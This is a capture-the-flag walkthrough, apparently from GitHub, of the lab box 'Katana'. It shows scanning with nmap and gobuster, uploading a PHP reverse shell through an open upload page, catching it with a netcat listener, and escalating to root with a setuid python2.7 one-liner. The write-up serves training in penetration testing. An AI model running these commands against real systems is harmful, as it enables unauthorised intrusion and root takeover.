### A step-by-step walkthrough of the VulnHub box **"Katana"** that exploits web server via a reverse shell upload

- **Box Host:** Offensive Security Proving Grounds
- **Difficulty Rating:** Easy
- **Starting Location:** Kali VM on the same subnet

**See this write-up in GitHub as well:**

https://digitalhammer.github.io/katana

- - - 
*Note 1: The IP addresses, URLs, and flags used in this demonstration were specific to the environment at the time of the exploit and will likely be different when another attempt at this box is made.*

*Note 2: There is almost always more than one way to expoit a box (TIMTOWTDI). The demonstration and tools shown here are probably not the only method you can use.*
- - -

### Step 1: Network Scanning
We want to begin by scanning the network we are on for potential targets. Since our starting location is on the same subnet of the machine(s) we want to gain access to, we can start by executing a stealth scan of the entire subnet and all ports using `nmap`:

- Stealth scan over entire subnet
```
nmap -sS 192.168.60.83
```

![Link an image](https://raw.githubusercontent.com/DigitalHammer/Security-Writeups/main/OffSec-ProvingGrounds/Katana/Images/01-nmap-stealth.jpg "Katana Walkthrough")

- Our scan found one potential target with two ports open to HTTP: `80` and `8088`
- Next we'll perform an aggressive scan over all ports on our potential target

```
nmap -A -p- 192.168.60.83
```

![Link an image](https://raw.githubusercontent.com/DigitalHammer/Security-Writeups/main/OffSec-ProvingGrounds/Katana/Images/02-nmap-aggressive-allports.jpg "Katana Walkthrough")

- Our new scan shows two more open ports `7080` and `8715` as well as technologies that may be useful to us in `Apache` and `LiteSpeed`
  - We should also note that port `8715` is also using HTTP. As highlighted in the screenshot, we now have 3 ports utilizing HTTP

---

### Step 2: Directory Brute Force
Now that we have a web server target, we can brute force through its directory to see if we can find out more information. We perform this by executing a directory brute force against the IP address using `gobuster`:

```
gobuster dir -u 192.168.60.83 -w /usr/share/wordlists/dirb/big.txt
```

![Link an image](https://raw.githubusercontent.com/DigitalHammer/Security-Writeups/main/OffSec-ProvingGrounds/Katana/Images/03-initial-gobuster.jpg "Katana Walkthrough")

- Our brute force showed us a subdirectory `/ebook`, which we can visit in the browser

```
http://192.168.60.83/ebook
```

![Link an image](https://raw.githubusercontent.com/DigitalHammer/Security-Writeups/main/OffSec-ProvingGrounds/Katana/Images/20-rabbithole.jpg "Katana Walkthrough")

![Link an image](https://raw.githubusercontent.com/DigitalHammer/Security-Writeups/main/OffSec-ProvingGrounds/Katana/Images/21-rabbithole.jpg "Katana Walkthrough")

- Our first screenshot brought up an online bookstore. But, what appears to me more important, is that this has an `Admin Login` button on the bottom right.
- Our second screenshot shows that this does indeed bring us to a login panel, asking for a username and password.
---
- ***Note: This machine has rabbit holes that lead us nowhere. This admin panel doesn't get end up getting us anywhere.***

- Although this looks promising at the start, it leads us to a dead end. It can be difficult to know in advance what may work and what may not work as we are attempting to gain access to the server. 
- We can try to avoid rabbit holes like this by performing more thorough scanning to try to see the whole picture. 
- We know from our `nmap` scans that this server has 3 open ports running on `HTTP`. We can run `gobuster` on each port to get a better idea of this server's layout. 
- In this case, we ended up finding an `upload.html` page that also looked promising by running `gobuster` on another HTTP port `8088` looking specifically for `.html` extensions. 

```
gobuster dir -u http://192.168.60.83:8088 -w /usr/share/wordlists/dirb/big.txt -x .html
```

![Link an image](https://raw.githubusercontent.com/DigitalHammer/Security-Writeups/main/OffSec-ProvingGrounds/Katana/Images/04-gobuster-upload.jpg "Katana Walkthrough")

- We can then visit the page in the browser and inspect further

```
http://192.168.60.83:8088/upload.html
```

![Link an image](https://raw.githubusercontent.com/DigitalHammer/Security-Writeups/main/OffSec-ProvingGrounds/Katana/Images/05-web-upload-page.jpg "Katana Walkthrough")

- It looks like we have the option to upload a file! 

---

### Step 3: Upload a Reverse Shell
Now that we have the potential to upload a file, we can test it by uploading a reverse shell to gain direct access to the server.

- Kali has a PHP reverse shell located in `/usr/share/webshells/php/php-reverse.shell.php`
- We will copy this file into our current directory and nano into it

```
sudo cp /usr/share/webshells/php/php-reverse.shell.php katana-revshell.php
```

*Note: the name we use after we copy the shell is abritrary, just make sure it ends in `.php`*

![Link an image](https://raw.githubusercontent.com/DigitalHammer/Security-Writeups/main/OffSec-ProvingGrounds/Katana/Images/06-reverseshell-copy-nano.jpg "Katana Walkthrough")

- Edit our new `katana-revshell.php` file by: 
  - Changing the IP address to our local Kali IP
  - Optional: we can change the port for our netcat listener or we can leave it as the default. We will leave it as default.

![Link an image](https://raw.githubusercontent.com/DigitalHammer/Security-Writeups/main/OffSec-ProvingGrounds/Katana/Images/07-reverseshell-modifyip.jpg "Katana Walkthrough")

- Upload the reverse shell on the Katana server and hit submit:

![Link an image](https://raw.githubusercontent.com/DigitalHammer/Security-Writeups/main/OffSec-ProvingGrounds/Katana/Images/08-upload-reverseshell.jpg "Katana Walkthrough")

- It looks like it accepted our upload! 
- Take note that we got a prompt that said it "Moved to other web server" and gave us the url of "/katana_katana-revshell.php"

---

### Step 4: Netcat Listener and Activate Shell
We know that we got prompted by the web server that it accepted our uploaded shell. Now we need to setup a netcat listener and activate the shell to see if it works. 

- Start our netcat listener using the port number from our PHP reverse shell

```
nc -lvp 1234
```

![Link an image](https://raw.githubusercontent.com/DigitalHammer/Security-Writeups/main/OffSec-ProvingGrounds/Katana/Images/09-netcat-start.jpg "Katana Walkthrough")

- Now we can either `curl` our shell or visit it in the browser to activate it. We will use `curl` from the command line to activate it.
- We also need to note that the web server told us our upload was moved to the other web server and gave us a url to it.
  - We know that we were on port `8088` when we uploaded our shell and we know that HTTP is open on ports `80` and `8715` as well.
  - Most likely, the web server it moved it to `8715`. We will use that port for the url in our `curl` command.

```
curl http://192.168.60.83:8715/katana_katanarevshell.php
```

![Link an image](https://raw.githubusercontent.com/DigitalHammer/Security-Writeups/main/OffSec-ProvingGrounds/Katana/Images/10-activate-shell.jpg "Katana Walkthrough")

- Success! Our terminal on the right shows our `curl` command to activate the shell and the terminal on the left shows our netcat listener gained a connection!

---

### Step 5: Find First Flag
Now that we are directly on the server, we want to look around for any flags we can find with our current level of access. 

- A first optional step is to setup a more "stable" shell. This will allow us to move more smoothly through the server. As can be seen in the image below, the first obvious convenience is the server is now showing us what directory we are in. 
  - Run this command on the server in the terminal where the Netcat listener is connected to:

```
python3 -c ‘import pty;pty.spawn(“/bin/bash”)’
```

![Link an image](https://raw.githubusercontent.com/DigitalHammer/Security-Writeups/main/OffSec-ProvingGrounds/Katana/Images/11-stable-shell.jpg "Katana Walkthrough")

- We will first `cd` home and list out what is there

```
cd 
```

```
ls
```

```
cat local.txt
```

![Link an image](https://raw.githubusercontent.com/DigitalHammer/Security-Writeups/main/OffSec-ProvingGrounds/Katana/Images/12-first-flag.jpg "Katana Walkthrough")

- We found our first flag located in the `home` directory in the file `local.txt`! 

---

### Step 6: Privilege Escalation
The next step is to see how we can gain root access to the server. There are several ways to go about this, including scripts that will attempt to find any kind of `sudo` rights, look over file permissions, and any other potential information that we can leverage. 
- The link below provides a checklist of commands we can run and areas to check:
  
```
https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/Cheat%20sheets%20reference%20pages%20Checklists%20-/Linux/cheat%20sheet%20Basic%20Linux%20Privilege%20Escalation.txt
```

- In this case, we were able to find potential leverage using the `getcap` command

```
/usr/sbin/getcap -r / 2>/dev/null
```

![Link an image](https://raw.githubusercontent.com/DigitalHammer/Security-Writeups/main/OffSec-ProvingGrounds/Katana/Images/13-priv-esc.jpg "Katana Walkthrough")

- This showed us `python2.7` with `setuid+ep`
- Now we can try to use python to open up a shell to gain root access:

```
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash ")'
```

![Link an image](https://raw.githubusercontent.com/DigitalHammer/Security-Writeups/main/OffSec-ProvingGrounds/Katana/Images/14-pwn.jpg "Katana Walkthrough")

- By running `whoami` we can confirm that we have successfully gained `root`! 

---

### Step 7: Find Root Flag
Now that we have root on the server, we want to use our increased level of access to find the final flag.

- We start out by seeing what is in our directory

```
ls
```

```
cat local.txt
```

![Link an image](https://raw.githubusercontent.com/DigitalHammer/Security-Writeups/main/OffSec-ProvingGrounds/Katana/Images/15-root-flag.jpg "Katana Walkthrough")

- We found the root flag!! 

---

### Summary
Congratulations! In this walkthrough we were able to gain access to an Apache web server by taking advantage of an upload feature to execute a PHP reverse shell. Our tools and methods can be highlighted into the following:
- Network scans using `nmap`
- Directory brute forcing using `gobuster`
- Uploading and gaining access via a `php reverse shell`
- Finding root privileges using `getcap`
- Gaining root access with a `python shell`

See this writeup in GitHub:

https://digitalhammer.github.io/katana

